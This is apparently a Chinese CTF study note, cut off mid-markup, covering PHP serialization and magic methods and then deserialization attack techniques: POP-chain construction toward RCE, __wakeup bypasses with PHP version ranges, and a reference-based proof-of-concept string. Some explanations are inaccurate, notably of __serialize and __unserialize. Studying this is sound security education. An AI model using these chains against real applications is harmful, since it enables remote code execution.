    <content type="html"><![CDATA[<h1 id="PHP-属性和权限"><a href="#PHP-属性和权限" class="headerlink" title="PHP 属性和权限"></a>PHP 属性和权限</h1><ul><li><p><strong>属性的权限，可以分为：</strong></p><ol><li><code>public</code> 权限 外部可以通过箭头访问到</li><li><code>private</code> 权限 内部通过 <code>$this-&gt;username</code> 访问到</li><li><code>protected</code> 权限 表示 自身及其子类 和父类 能够访问</li></ol></li><li><p><strong>抽象类</strong></p><ul><li>不能被 <code>new</code>，也就是不能被直接实例化对象</li></ul></li><li><p><strong>接口 <code>interface</code></strong></p><ul><li>为了实现多继承效果</li><li><code>implements</code> 可以实现多个接口</li></ul></li><li><p><strong>方法的属性修饰符</strong></p><ul><li><code>public</code></li><li><code>private</code></li><li><code>protected</code></li></ul></li><li><p><strong>修饰：</strong></p><ul><li>静态属性 <code>static</code></li><li><code>final</code> 属性 <code>final</code></li></ul></li></ul><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><ul><li>如果属性权限为 <code>private</code>，那么序列化后，存储的属性名字为 <code>%00+类名+%00+属性名</code></li><li>如果属性权限为 <code>protected</code>，那么序列化后，存储的属性名字为 <code>%00+*+%00+属性名</code></li><li>序列化是将一个对象变为一个可以传输的字符串 <code>serialize(对象)</code> 返回序列化后的字符串</li><li>反序列化就是将一个可以传输的字符串变为一个可以调用的对象 <code>unserialize(反序列化后的字符串)</code> 返回对象</li></ul><h3 id="反序列化示例："><a href="#反序列化示例：" class="headerlink" title="反序列化示例："></a>反序列化示例：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>反序列化时，PHP会做以下操作：</strong><ol><li>找到反序列化字符串规定的类名字 </li><li>实例化这个类，但不会调用构造方法</li><li>有了实例化的类对象，对它的属性进行赋值</li><li>执行魔术方法 <code>__wakeup()</code> 和 <code>__unserialize()</code></li><li>返回构造好的对象</li></ol></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$city</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zip</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$city</span>, <span class="hljs-variable">$zip</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;city = <span class="hljs-variable">$city</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;zip = <span class="hljs-variable">$zip</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$address</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phoneNumbers</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$address</span>, <span class="hljs-variable">$phoneNumbers</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;address = <span class="hljs-variable">$address</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;phoneNumbers = <span class="hljs-variable">$phoneNumbers</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$address</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">&quot;New York&quot;</span>, <span class="hljs-string">&quot;10001&quot;</span>);<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-variable">$address</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;123-456-7890&quot;</span>, <span class="hljs-string">&quot;098-765-4321&quot;</span>));<br><span class="hljs-variable">$serializedData</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedData</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>结果是：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>解读序列化字符串：</strong></p><ol><li><p><strong>识别外层对象：</strong></p><ul><li><code>O:4:&quot;User&quot;:3:</code></li><li><code>O</code> 表示对象（Object）。</li><li><code>4</code> 表示类名长度。</li><li><code>&quot;User&quot;</code> 是类名。</li><li><code>3</code> 表示对象的属性数量。</li></ul></li><li><p><strong>解析对象属性：</strong></p><ul><li><code>&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;s:12:&quot;phoneNumbers&quot;;a:2:&#123;i:0;s:12:&quot;123-456-7890&quot;;i:1;s:12:&quot;098-765-4321&quot;;&#125;&#125;</code></li><li>解析第一个属性：<ul><li><code>s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;</code></li></ul></li><li>解析第二个属性：<ul><li><code>s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code></li><li><code>s:7:&quot;address&quot;</code> 表示字符串属性名，长度为 7，内容是 “address”</li><li><code>O:7:&quot;Address&quot;:2:</code> 表示一个嵌套的 Address 对象</li><li><code>&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code> 包含了 Address 对象的属性。</li><li><code>s:4:&quot;city&quot;;s:8:&quot;New York&quot;;</code> 表示 Address 对象的第一个属性。</li><li><code>s:4:&quot;city&quot;</code> 表示字符串属性名，长度为 4，内容是 “city”。</li><li><code>s:8:&quot;New York&quot;</code> 表示字符串属性值，长度为 8，内容是 “New York”。</li><li><code>s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;</code> 表示 Address 对象的第二个属性。</li><li><code>s:3:&quot;zip&quot;</code> 表示字符串属性名，长度为 3，内容是 “zip”。</li><li><code>s:5:&quot;10001&quot;</code> 表示字符串属性值，长度为 5，内容是 “10001”。</li></ul></li></ul></li></ol></li><li><p><strong><code>$this</code>解释为当前对象里的：</strong></p><ul><li><code>__construct</code>：当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</li><li><code>__destruct</code>：当 PHP 脚本执行结束前一秒当一个对象被销毁前自动调用这个方法，可以用来释放对象占用的资源。</li><li><code>__call</code>：在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</li><li><code>__callStatic</code>：在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</li><li><code>__get</code>：当读取（<code>echo</code>）访问（<code>$myObject-&gt;age;</code>）一个不存在或不可访问的属性时，<code>__get</code> 方法会被自动调用。</li><li><code>__set</code>：当设置（赋值）一个不存在或不可访问的属性时，<code>__set</code> 方法会被自动调用。</li><li><code>__isset</code>：当使用 <code>isset()</code> 或 <code>empty()</code> 测试一个对象的属性是否存在时自动调用这个方法，可以用来实现属性的访问控制。</li><li><code>__unset</code>：当使用 <code>unset()</code> 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</li><li><code>__toString</code>：当一个对象被当做字符串时（<code>echo $myObject;</code>）（<code>preg_match</code>时）自动调用这个方法，可以用来实现对象的字符串表示。</li><li><code>__invoke</code>：当一个对象被作为函数调用<code>$myObject(&#39;ChatGPT&#39;);</code>自动调用这个方法，可以用来实现对象的可调用性。</li><li><code>__set_state</code>：当使用 <code>var_export()</code> 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</li><li><code>__clone</code>：当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</li><li><code>__debugInfo</code>：当使用 <code>var_dump()</code> 或 <code>print_r()</code> 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</li><li><code>__sleep</code>：在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</li><li><code>__wakeup</code>：在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</li><li><code>__unserialize()</code> 是 PHP 7.4 中引入的一个魔术方法，将对象序列化为数组，同时在序列化时对敏感数据（如密码）进行加密处理。在PHP7.4.0开始，如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法。</li><li><code>__serialize()</code> 方法：反序列化时，从数组中恢复对象状态，并对敏感数据（如密码）进行解密处理。使用 <code>serialize()</code> 将对象序列化为字符串时，<code>__serialize()</code> 方法被调用，并将属性打包为数组。</li></ul></li></ul><hr><h3 id="这里是被调用的例子"><a href="#这里是被调用的例子" class="headerlink" title="这里是被调用的例子"></a>这里是被调用的例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br><br>    <span class="hljs-comment">// __set() 方法在给不存在的属性赋值时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;设置属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 为 &#x27;<span class="hljs-subst">$value</span>&#x27;。&quot;</span> . PHP_EOL;      <span class="hljs-comment">//设置属性 &#x27;name&#x27; 为 &#x27;ChatGPT&#x27;。</span><br>        <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// __get() 方法在访问不存在的属性时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;data)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;访问属性 &#x27;<span class="hljs-subst">$name</span>&#x27;，值为：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] . PHP_EOL;    <span class="hljs-comment">//访问属性 &#x27;name&#x27;，值为：ChatGPT</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br>&#125;<br><br><span class="hljs-comment">// __unset() 方法，用于删除属性</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>])) &#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 已被删除。&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;<span class="hljs-subst">$name</span>&#x27; 不存在。&quot;</span> . PHP_EOL;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;对象的名称是：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br><span class="hljs-comment">// __invoke() 方法会在对象被当作函数调用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;message . <span class="hljs-string">&quot;, &quot;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br><span class="hljs-comment">// __sleep() 方法在对象序列化之前调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 仅返回需要序列化的属性</span><br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&#x27;name&#x27;</span>];<br>    &#125;<br><span class="hljs-comment">// __wakeup() 方法在对象反序列化之后调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// 重新初始化或恢复对象的状态</span><br>        <span class="hljs-variable language_">$this</span>-&gt;sessionData = <span class="hljs-string">&quot;Session data restored&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">// 创建类的实例</span><br><span class="hljs-variable">$myObject</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-comment">// 设置不存在的属性</span><br><span class="hljs-variable">$myObject</span>-&gt;name = <span class="hljs-string">&#x27;ChatGPT&#x27;</span>;<br><span class="hljs-comment">// 访问不存在的属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;name . PHP_EOL;<br><span class="hljs-variable">$nonExistent</span> = <span class="hljs-variable">$myObject</span>-&gt;age;<br><span class="hljs-comment">// 访问未设置的属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;age . PHP_EOL;<br><span class="hljs-comment">// 使用 isset() 检查属性是否存在</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$myObject</span>-&gt;name)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;name&#x27; 存在。&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;属性 &#x27;name&#x27; 不存在。&quot;</span> . PHP_EOL;<br>&#125;<br><span class="hljs-comment">// 删除属性</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$myObject</span>-&gt;name);<br><span class="hljs-comment">// 直接输出对象，自动调用 __toString()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>;<br><span class="hljs-comment">// 直接调用对象，自动调用 __invoke()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>(<span class="hljs-string">&#x27;ChatGPT&#x27;</span>);<br><span class="hljs-comment">// 序列化对象__sleep() 方法返回一个包含 &#x27;name&#x27; 的数组，表示只有 name 属性会被序列化。serialize($myObject) 时，password 和 sessionData 属性不会被序列化，因为它们没有包含在 __sleep() 方法返回的数组中。</span><br><span class="hljs-variable">$serializedObject</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$myObject</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedObject</span>; <span class="hljs-comment">// 输出: O:7:&quot;MyClass&quot;:1:&#123;s:8:&quot;\0MyClass\0name&quot;;s:7:&quot;ChatGPT&quot;;&#125;</span><br><span class="hljs-comment">// 反序列化对象</span><br><span class="hljs-variable">$unserializedObject</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serializedObject</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="三种方法赋值"><a href="#三种方法赋值" class="headerlink" title="三种方法赋值"></a>三种方法赋值</h3><ol><li><p><strong>直接写只能写字符串：</strong></p><ul><li><code>private $username = &#39;xxxxxx&#39;;</code></li></ul></li><li><p><strong>外部写意图把类里的 <code>$a</code> 变量其他 <code>$b</code>，这样就写出了 pop，即：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SHOW;<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> CTF;<br><span class="hljs-variable">$s</span>-&gt;a = <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><ul><li>但是不能对私有属性进行赋值。</li></ul></li><li><p><strong>构造方法赋值：</strong></p><ul><li>以上缺点都没了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = <span class="hljs-title">new</span> <span class="hljs-title">backdoor</span>();</span><br><span class="hljs-class">&#125;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><hr><h1 id="构造-pop-链"><a href="#构造-pop-链" class="headerlink" title="构造 pop 链"></a>构造 pop 链</h1><ul><li><strong>重点找起始和 RCE 终点，期间的变量赋值为变量时要外部赋值，普通变量就直接赋值。</strong></li><li><strong>链子：</strong>终点开始编写链子，期间用各种魔法方法到起点（利用 <code>new</code> 关键词开始 <code>construct</code>，<code>destruct</code>，<code>wakeup</code>），再把起点对象序列化。</li><li><strong>检查就是从后往前读了。</strong></li></ul><h1 id="序列化绕过"><a href="#序列化绕过" class="headerlink" title="序列化绕过"></a>序列化绕过</h1><ul><li><strong>绕过 <code>\0</code> 脚本或利用 PHP 7.1+ 的特性，直接用 <code>public</code> 生成字符串但容错机制。</strong></li><li><strong>指针引用：</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span>-&gt;a1 =&amp; <span class="hljs-variable">$b</span>-&gt;a2;<br><span class="hljs-variable">$a</span> = <span class="hljs-number">10</span>;<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b 是 $a 的引用</span><br><span class="hljs-variable">$b</span> = <span class="hljs-number">20</span>;  <span class="hljs-comment">// 改变 $b 也会改变 $a</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <span class="hljs-comment">// 输出 20</span><br></code></pre></td></tr></table></figure></li><li><strong>畸形字符串</strong> <ul><li><strong>绕过 <code>wakeup</code>。</strong></li></ul></li><li><strong>利用将属性值变大。</strong></li></ul><h1 id="使用-C-代替-O"><a href="#使用-C-代替-O" class="headerlink" title="使用 C 代替 O"></a>使用 C 代替 O</h1><h3 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h3><ul><li><code>5.3.0 - 5.3.29</code></li><li><code>5.4.0 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.40</code></li><li><code>7.0.0 - 7.0.33</code></li><li><code>7.1.0 - 7.1.33</code></li><li><code>7.2.0 - 7.2.34</code></li><li><code>7.3.0 - 7.3.28</code></li><li><code>7.4.0 - 7.4.16</code></li><li><code>8.0.0 - 8.0.3</code></li><li><strong>只能执行 <code>construct()</code> 函数，无法添加任何内容，然后析构函数最后执行。</strong></li></ul><h3 id="序列化机制构造一个对象，其中包含对象引用："><a href="#序列化机制构造一个对象，其中包含对象引用：" class="headerlink" title="序列化机制构造一个对象，其中包含对象引用："></a>序列化机制构造一个对象，其中包含对象引用：</h3><ul><li><code>7.0.0 - 7.0.14</code></li><li><code>7.1.0</code></li><li><code>5.4.14 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.29</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/iLSA7</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=73367</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Not a serializable object&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ryat == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&#x27;dtor!&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;O:3:&quot;obj&quot;:2:&#123;s:4:&quot;ryat&quot;;i:1;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;&#125;&#x27;</span>;<span class="hljs-comment">//构造一个对象，其中 ryat 被设置为 1，然后让对象的另一个属性通过引用指向 ryat __wakeup() 修改了 ryat，但由于引用的存在，这个修改在某些地方不起作用，从而在 __destruct() 中成功触发了你原本不希望被触发的代码。</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br></code></pre></td></tr></table></figure></li><li><strong>多写一个 <code>i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;</code> 再改对象数仿照以上。</strong></li></ul><h3 id="利用-fastdestruct-机制让-destruct-跑到前面去："><a 